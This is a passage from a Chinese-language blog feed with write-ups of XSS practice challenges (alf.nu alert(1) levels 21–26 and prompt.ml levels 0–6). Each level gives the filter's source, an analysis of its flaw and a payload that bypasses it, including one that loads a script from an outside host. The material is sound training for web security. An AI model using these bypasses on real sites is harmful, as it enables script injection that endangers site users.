class="hljs-number">0</span>]+[])[<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;p&quot;</span>]+[])[<span class="hljs-number">26</span>] === <span class="hljs-string">&quot;o&quot;</span><br></code></pre></td></tr></table></figure><p>这样所有的字符就都获取到了，修改一下<code>Payload</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">[][<span class="hljs-string">&quot;m&quot;</span>+(<span class="hljs-number">1</span>+[][<span class="hljs-number">0</span>]+[])[<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;p&quot;</span>][<span class="hljs-string">&quot;c&quot;</span>+([][<span class="hljs-string">&quot;m&quot;</span>+(<span class="hljs-number">1</span>+[][<span class="hljs-number">0</span>]+[])[<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;p&quot;</span>]+[])[<span class="hljs-number">26</span>]+<span class="hljs-string">&quot;nstr&quot;</span>+([][[]]+[])[<span class="hljs-number">0</span>]+<span class="hljs-string">&quot;ct&quot;</span>+([][<span class="hljs-string">&quot;m&quot;</span>+(<span class="hljs-number">1</span>+[][<span class="hljs-number">0</span>]+[])[<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;p&quot;</span>]+[])[<span class="hljs-number">26</span>]+<span class="hljs-string">&quot;r&quot;</span>]((<span class="hljs-number">1</span>+[][<span class="hljs-number">0</span>]+[])[<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;l&quot;</span>+([][[]]+[])[<span class="hljs-number">3</span>]+<span class="hljs-string">&quot;rt(1)&quot;</span>)()<br></code></pre></td></tr></table></figure><p>再闭合一下就OK了</p><h3 id="21-3-Payload"><a href="#21-3-Payload" class="headerlink" title="21.3 Payload"></a>21.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot;);[][&quot;</span>m<span class="hljs-string">&quot;+(1+[][0]+[])[1]+&quot;</span>p<span class="hljs-string">&quot;][&quot;</span>c<span class="hljs-string">&quot;+([][&quot;</span>m<span class="hljs-string">&quot;+(1+[][0]+[])[1]+&quot;</span>p<span class="hljs-string">&quot;]+[])[26]+&quot;</span>nstr<span class="hljs-string">&quot;+([][[]]+[])[0]+&quot;</span>ct<span class="hljs-string">&quot;+([][&quot;</span>m<span class="hljs-string">&quot;+(1+[][0]+[])[1]+&quot;</span>p<span class="hljs-string">&quot;]+[])[26]+&quot;</span>r<span class="hljs-string">&quot;]((1+[][0]+[])[1]+&quot;</span>l<span class="hljs-string">&quot;+([][[]]+[])[3]+&quot;</span>rt(<span class="hljs-number">1</span>)<span class="hljs-string">&quot;)()//</span><br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/xss-alf.nu/20190607162658.png"></p><h2 id="22-Fruit"><a href="#22-Fruit" class="headerlink" title="22. Fruit"></a>22. Fruit</h2><h3 id="22-1-源码"><a href="#22-1-源码" class="headerlink" title="22.1 源码"></a>22.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// CVE-2016-4618</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> div = <span class="hljs-built_in">document</span>.implementation.createHTMLDocument().createElement(<span class="hljs-string">&#x27;div&#x27;</span>);<br>    div.innerHTML = s;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">f</span>(<span class="hljs-params">n</span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;SCRIPT&#x27;</span> === n.tagName) n.parentNode.removeChild(n);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; n.attributes.length; i++) &#123;<br>            <span class="hljs-keyword">var</span> name = n.attributes[i].name;<br>            <span class="hljs-keyword">if</span> (name !== <span class="hljs-string">&#x27;class&#x27;</span>) &#123;<br>                n.removeAttribute(name);<br>            &#125;<br>        &#125;<br>    &#125; [].map.call(div.querySelectorAll(<span class="hljs-string">&#x27;*&#x27;</span>), f);<br>    <span class="hljs-keyword">return</span> div.innerHTML;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="22-2-分析"><a href="#22-2-分析" class="headerlink" title="22.2 分析"></a>22.2 分析</h3><p>题目直接给了提示<code>CVE-2016-4618</code>，但发现没啥用。<br>在这里，代码主要的问题出现在逻辑上，在<code>for</code>循环中，代码通过<code>n.attributes.length</code>来判断边界条件，但是<code>n.attributes.length</code>是动态变化的，如果存在多个属性，则最后一个属性是无法删除的，只要我们构造多个属性即可。</p><h3 id="22-3-Payload"><a href="#22-3-Payload" class="headerlink" title="22.3 Payload"></a>22.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;iframe t onload=alert(<span class="hljs-number">1</span>)&gt;<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/xss-alf.nu/20190609205936.png"></p><h2 id="23-Fruit-2"><a href="#23-Fruit-2" class="headerlink" title="23. Fruit 2"></a>23. Fruit 2</h2><h3 id="23-1-源码"><a href="#23-1-源码" class="headerlink" title="23.1 源码"></a>23.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// CVE-2016-7650</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> div = <span class="hljs-built_in">document</span>.implementation.createHTMLDocument().createElement(<span class="hljs-string">&#x27;div&#x27;</span>);<br>    div.innerHTML = s;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">f</span>(<span class="hljs-params">n</span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-regexp">/script/i</span>.test(n.tagName)) n.parentNode.removeChild(n);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; n.attributes.length; i++) &#123;<br>            <span class="hljs-keyword">var</span> name = n.attributes[i].name;<br>            <span class="hljs-keyword">if</span> (name !== <span class="hljs-string">&#x27;class&#x27;</span>) &#123;<br>                n.removeAttribute(name);<br>            &#125;<br>        &#125;<br>    &#125; [].map.call(div.querySelectorAll(<span class="hljs-string">&#x27;*&#x27;</span>), f);<br>    <span class="hljs-keyword">return</span> div.innerHTML;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="23-2-分析"><a href="#23-2-分析" class="headerlink" title="23.2 分析"></a>23.2 分析</h3><p>提示依旧没啥用，而且代码较上一题区别不大，使用同一个<code>Payload</code>即可。</p><h3 id="23-3-Payload"><a href="#23-3-Payload" class="headerlink" title="23.3 Payload"></a>23.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;iframe t onload=alert(<span class="hljs-number">1</span>)&gt;<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/xss-alf.nu/20190609210305.png"></p><h2 id="24-Capitals"><a href="#24-Capitals" class="headerlink" title="24. Capitals"></a>24. Capitals</h2><h3 id="24-1-源码"><a href="#24-1-源码" class="headerlink" title="24.1 源码"></a>24.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// submitted by msamuel</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> capitals = &#123;<br>        <span class="hljs-string">&quot;CA&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;AB&quot;</span>: <span class="hljs-string">&quot;Edmonton&quot;</span>,<br>            <span class="hljs-string">&quot;BC&quot;</span>: <span class="hljs-string">&quot;Victoria&quot;</span>,<br>            <span class="hljs-string">&quot;MB&quot;</span>: <span class="hljs-string">&quot;Winnipeg&quot;</span>,<br>            <span class="hljs-comment">// etc.</span><br>        &#125;,<br>        <span class="hljs-string">&quot;US&quot;</span>: &#123;<br>            <span class="hljs-comment">// Alabama changed its state capital.</span><br>            <span class="hljs-string">&quot;AL&quot;</span>: ((year) = &gt;year &lt; <span class="hljs-number">1846</span> ? <span class="hljs-string">&quot;Tuscaloosa&quot;</span>: <span class="hljs-string">&quot;Montgomery&quot;</span>),<br>            <span class="hljs-string">&quot;AK&quot;</span>: <span class="hljs-string">&quot;Juneau&quot;</span>,<br>            <span class="hljs-string">&quot;AR&quot;</span>: <span class="hljs-string">&quot;Phoenix&quot;</span>,<br>            <span class="hljs-comment">// etc.</span><br>        &#125;,<br>    &#125;;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">capitalOf</span>(<span class="hljs-params">country, stateOrProvinceName, year</span>) </span>&#123;<br>        <span class="hljs-keyword">var</span> capital = capitals[country][stateOrProvinceName];<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> capital === <span class="hljs-string">&#x27;function&#x27;</span>) &#123;<br>            capital = capital(year);<br>        &#125;<br>        <span class="hljs-keyword">return</span> capital<br>    &#125;<br><br>    <span class="hljs-keyword">var</span> inputs = (s || <span class="hljs-string">&quot;&quot;</span>).split(<span class="hljs-regexp">/#/g</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;b&gt;&#x27;</span> + capitalOf(inputs[<span class="hljs-number">0</span>], inputs[<span class="hljs-number">1</span>], inputs[<span class="hljs-number">2</span>]) + <span class="hljs-string">&#x27;&lt;/b&gt;&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="24-2-分析"><a href="#24-2-分析" class="headerlink" title="24.2 分析"></a>24.2 分析</h3><p>代码的逻辑很简单，我们要想执行<code>alert(1)</code>，需要满足<code>if (typeof capital === &#39;function&#39;)</code>，而<code>var capital = capitals[country][stateOrProvinceName];</code>，这里想到了我们前面做题用到的匿名函数。</p><p><img src="https://image.mengsec.com/xss-alf.nu/20190609211136.png"></p><p>然后我们再用<code>&lt;/b&gt;</code>闭合<code>b</code>标签，添加<code>&lt;script&gt;</code>标签来执行<code>alert(1)</code>。</p><h3 id="24-3-Payload"><a href="#24-3-Payload" class="headerlink" title="24.3 Payload"></a>24.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">CA#<span class="hljs-title">constructor</span>#&lt;/<span class="hljs-title">b</span>&gt;&lt;<span class="hljs-title">script</span>&gt;<span class="hljs-title">alert</span>(<span class="hljs-params"><span class="hljs-number">1</span></span>)&lt;/<span class="hljs-title">script</span>&gt;<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/xss-alf.nu/20190609100344.png"></p><h2 id="25-Entities"><a href="#25-Entities" class="headerlink" title="25. Entities"></a>25. Entities</h2><h3 id="25-1-源码"><a href="#25-1-源码" class="headerlink" title="25.1 源码"></a>25.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// submitted by securityMB</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">htmlentities</span>(<span class="hljs-params">s</span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> s.replace(<span class="hljs-regexp">/[&amp;&lt;&gt;&quot;&#x27;]/g</span>, c = &gt;<span class="hljs-string">` &amp; #$ &#123;</span><br><span class="hljs-string">            c.charCodeAt(0)</span><br><span class="hljs-string">        &#125;;`</span>)<br>    &#125;<br>    s = htmlentities(s);<br>    <span class="hljs-keyword">return</span><span class="hljs-string">` &lt; script &gt;</span><br><span class="hljs-string">    var obj = &#123;&#125;;</span><br><span class="hljs-string">    obj[&quot;<span class="hljs-subst">$&#123;s&#125;</span>&quot;] = &quot;<span class="hljs-subst">$&#123;s&#125;</span>&quot;; &lt; /script&gt;`</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="25-2-分析"><a href="#25-2-分析" class="headerlink" title="25.2 分析"></a>25.2 分析</h3><p>代码对<code>&amp;</code>、<code>&lt;</code>、<code>&gt;</code>、<code>&quot;</code>、<code>&#39;</code>进行了转义，后面返回值部分存在两个拼接点。借助转义符<code>\</code>和注释符来进行绕过，拼接代码执行。</p><h3 id="25-3-Payload"><a href="#25-3-Payload" class="headerlink" title="25.3 Payload"></a>25.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">];alert(<span class="hljs-number">1</span>)<span class="hljs-comment">//\</span><br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/xss-alf.nu/20190607220233.png"></p><h2 id="26-level"><a href="#26-level" class="headerlink" title="26. %level%"></a>26. %level%</h2><h3 id="26-1-源码"><a href="#26-1-源码" class="headerlink" title="26.1 源码"></a>26.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// submitted anonymously</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-keyword">const</span> userInput = <span class="hljs-built_in">JSON</span>.stringify(s).replace(<span class="hljs-regexp">/[&lt;]/g</span>, <span class="hljs-string">&#x27;%lt&#x27;</span>).replace(<span class="hljs-regexp">/[&gt;]/g</span>, <span class="hljs-string">&#x27;%gt&#x27;</span>);<br>    <span class="hljs-keyword">const</span> userTemplate = <span class="hljs-string">&#x27;&lt;script&gt;let some = %userData%&lt;/script&gt;&#x27;</span>;<br>    <span class="hljs-keyword">return</span> userTemplate.replace(<span class="hljs-regexp">/%userData%/</span>, userInput);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="26-2-分析"><a href="#26-2-分析" class="headerlink" title="26.2 分析"></a>26.2 分析</h3><p>代码对输入的字符串使用<code>JSON.stringify</code>进行了处理，然后对<code>&lt;</code>和<code>&gt;</code>进行了编码。<br>在<code>replace</code>中，<code>userInput</code>是可控的，在这里用到了关于<code>String​.prototype​.replace()</code>的一个小<code>trick</code>。</p><blockquote><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/replace">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/replace</a></p></blockquote><p><img src="https://image.mengsec.com/xss-alf.nu/20190609211849.png"></p><p>我们可以通过<code>$&#39;</code>来引入匹配的子串右边的内容<code>&lt;/script&gt;</code>来闭合开头的<code>&lt;script&gt;</code>，然后使用<code>$\</code>来引入匹配的子串左边的内容<code>&lt;script&gt;let some = </code>，这样就没有双引号来干扰了，直接使用调用<code>alert(1)</code>，然后注释掉后面的代码即可。</p><h3 id="26-3-Payload"><a href="#26-3-Payload" class="headerlink" title="26.3 Payload"></a>26.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">$<span class="hljs-string">&#x27;$`alert(1)//</span><br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/xss-alf.nu/20190609212959.png"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol><li> <a href="https://cxliker.github.io/2018/01/29/XSS%E7%BB%83%E4%B9%A0-alf-nu-alert1-Write-ups/">https://cxliker.github.io/2018/01/29/XSS%E7%BB%83%E4%B9%A0-alf-nu-alert1-Write-ups/</a></li><li> <a href="https://github.com/masazumi-github/alert-1-to-win#a028">https://github.com/masazumi-github/alert-1-to-win#a028</a></li><li> <a href="http://juniorprincewang.github.io/2018/10/14/alf-nu-alert1%E6%80%BB%E7%BB%93/">http://juniorprincewang.github.io/2018/10/14/alf-nu-alert1%E6%80%BB%E7%BB%93/</a></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>Writeup</tag>
      
      <tag>XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS靶场练习（一）</title>
    <link href="/2019/06/04/prompt1_to_win/"/>
    <url>/2019/06/04/prompt1_to_win/</url>
    
    <content type="html"><![CDATA[<p>一直对XSS了解的不够深，找了一个<a href="http://prompt.ml/">平台</a>来练习下，目的是执行<code>prompt(1)</code></p><a id="more"></a><h3 id="第0关"><a href="#第0关" class="headerlink" title="第0关"></a>第0关</h3><p>没有任何过滤，直接闭合标签即可<br>Payload:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot;&gt;&lt;script&gt;prompt(1)&lt;/script&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/xss-prompt/20190529211042.png"></p><h3 id="第1关"><a href="#第1关" class="headerlink" title="第1关"></a>第1关</h3><p>源码</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">function</span> <span class="hljs-keyword">escape</span>(<span class="hljs-keyword">input</span>) &#123;<br>    // tags stripping mechanism <span class="hljs-keyword">from</span> ExtJS library<br>    // Ext.util.<span class="hljs-keyword">Format</span>.stripTags<br>    var stripTagsRE = /&lt;\/?[^&gt;]+&gt;/gi;<br>    input = <span class="hljs-keyword">input</span>.replace(stripTagsRE, <span class="hljs-string">&#x27;&#x27;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;article&gt;&#x27;</span> + <span class="hljs-keyword">input</span> + <span class="hljs-string">&#x27;&lt;/article&gt;&#x27;</span>;<br>&#125; <br></code></pre></td></tr></table></figure><p>可以看到加了一个正则，来过滤了形如<code>&lt;xxx&gt;</code>的内容，可以使用注释符号<code>//</code>来绕过，借助<code>onload</code>事件来执行代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;body onload=prompt(<span class="hljs-number">1</span>)<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/xss-prompt/20190529211450.png"></p><h3 id="第2关"><a href="#第2关" class="headerlink" title="第2关"></a>第2关</h3><p>源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">input</span>) </span>&#123;<br>    <span class="hljs-comment">//                      v-- frowny face</span><br>    input = input.replace(<span class="hljs-regexp">/[=(]/g</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br><br>    <span class="hljs-comment">// ok seriously, disallows equal signs and open parenthesis</span><br>    <span class="hljs-keyword">return</span> input;<br>&#125; <br></code></pre></td></tr></table></figure><p>根据正则，可以判断过滤了<code>(</code>和<code>=</code>两个字符，可以使用编码绕过，但是我直接使用</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;&amp;#112;&amp;#114;&amp;#111;&amp;#109;&amp;#112;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>不能成功，在前面加了一个<code>svg</code>标签就可以了。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;svg&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="handlebars"><span class="xml"><span class="hljs-symbol">&amp;#112;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#111;</span><span class="hljs-symbol">&amp;#109;</span><span class="hljs-symbol">&amp;#112;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#40;</span><span class="hljs-symbol">&amp;#49;</span><span class="hljs-symbol">&amp;#41;</span></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>找到了一个解释</p><blockquote><p><a href="http://pupiles.com/xss.html">http://pupiles.com/xss.html</a></p></blockquote><p>后面仔细研究下<code>HTML</code>的解析流程。</p><p><img src="https://image.mengsec.com/xss-prompt/20190529220030.png"></p><h3 id="第3关"><a href="#第3关" class="headerlink" title="第3关"></a>第3关</h3><p>源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">input</span>) </span>&#123;<br>    <span class="hljs-comment">// filter potential comment end delimiters</span><br>    input = input.replace(<span class="hljs-regexp">/-&gt;/g</span>, <span class="hljs-string">&#x27;_&#x27;</span>);<br><br>    <span class="hljs-comment">// comment the input to avoid script execution</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;!-- &#x27;</span> + input + <span class="hljs-string">&#x27; --&gt;&#x27;</span>;<br>&#125;        <br></code></pre></td></tr></table></figure><p>使用正则将<code>-&gt;</code>替换为<code>_</code><br>在这里用到了<code>HTML5</code>中的一个<code>trick</code>，可以使用<code>--!&gt;</code>来闭合注释<br>Payload:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">--!&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>prompt(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/xss-prompt/20190529221640.png"></p><h3 id="第4关"><a href="#第4关" class="headerlink" title="第4关"></a>第4关</h3><p>源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">input</span>) </span>&#123;<br>    <span class="hljs-comment">// make sure the script belongs to own site</span><br>    <span class="hljs-comment">// sample script: http://prompt.ml/js/test.js</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-regexp">/^(?:https?:)?\/\/prompt\.ml\//i</span>.test(<span class="hljs-built_in">decodeURIComponent</span>(input))) &#123;<br>        <span class="hljs-keyword">var</span> script = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;script&#x27;</span>);<br>        script.src = input;<br>        <span class="hljs-keyword">return</span> script.outerHTML;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid resource.&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个折腾了好久没做出来，看了下<code>Writeup</code>，利用URL的组成来绕过正则的检测，不过已经在最新版Chrome和Firefox上失效了。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://prompt.ml%<span class="hljs-number">2</span>f@test.mengsec.com/<span class="hljs-number">1</span>.js<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/xss-prompt/20190530173025.png"></p><h3 id="第5关"><a href="#第5关" class="headerlink" title="第5关"></a>第5关</h3><p>源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">input</span>) </span>&#123;<br>    <span class="hljs-comment">// apply strict filter rules of level 0</span><br>    <span class="hljs-comment">// filter &quot;&gt;&quot; and event handlers</span><br>    input = input.replace(<span class="hljs-regexp">/&gt;|on.+?=|focus/gi</span>, <span class="hljs-string">&#x27;_&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;input value=&quot;&#x27;</span> + input + <span class="hljs-string">&#x27;&quot; type=&quot;text&quot;&gt;&#x27;</span>;<br>&#125;    <br></code></pre></td></tr></table></figure><p>正则匹配<code>&gt;</code>、<code>onxxx=</code>或者<code>focus</code>之类的字符，修饰符<code>i</code>匹配大小写，修饰符<code>g</code>全局匹配。<br>在<code>HTML</code>中，换行符等空白字符不会影响<code>HTML</code>解析。<br>又因为浏览器默认解析第一个<code>type</code>，因此可以使用构造<code>payload</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot;type=&quot;</span>image<span class="hljs-string">&quot;  src=233  onerror </span><br><span class="hljs-string">=&quot;</span>prompt(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/xss-prompt/20190530174644.png"></p><h3 id="第6关"><a href="#第6关" class="headerlink" title="第6关"></a>第6关</h3><p>源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">input</span>) </span>&#123;<br>    <span class="hljs-comment">// let&#x27;s do a post redirection</span><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// pass in formURL#formDataJSON</span><br>        <span class="hljs-comment">// e.g. http://httpbin.org/post#&#123;&quot;name&quot;:&quot;Matt&quot;&#125;</span><br>        <span class="hljs-keyword">var</span> segments = input.split(<span class="hljs-string">&#x27;#&#x27;</span>);<br>        <span class="hljs-keyword">var</span> formURL = segments[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">var</span> formData = <span class="hljs-built_in">JSON</span>.parse(segments[<span class="hljs-number">1</span>]);<br><br>        <span class="hljs-keyword">var</span> form = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;form&#x27;</span>);<br>        form.action = formURL;<br>        form.method = <span class="hljs-string">&#x27;post&#x27;</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i <span 